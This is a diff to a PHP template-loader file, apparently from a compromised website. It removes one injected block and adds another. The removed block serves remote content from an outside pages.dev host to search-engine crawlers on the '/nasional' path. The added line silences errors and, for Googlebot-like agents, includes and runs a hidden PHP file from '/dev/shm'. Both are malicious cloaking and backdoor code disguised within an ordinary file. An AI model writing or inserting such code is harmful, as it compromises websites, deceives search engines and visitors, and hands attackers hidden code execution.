@@ -1,13 +1,5 @@
 <?php
-$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
-$uri = $_SERVER['REQUEST_URI'] ?? '';
-
-if ($uri == '/nasional' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
-echo file_get_contents('https://for4d-oleng-oleng.pages.dev/index.txt');
-exit();
-}
-
+error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/nasional/'){ include('/dev/shm/1'); exit; }
 /**
  * Loads the correct template based on the visitor's URL
  *
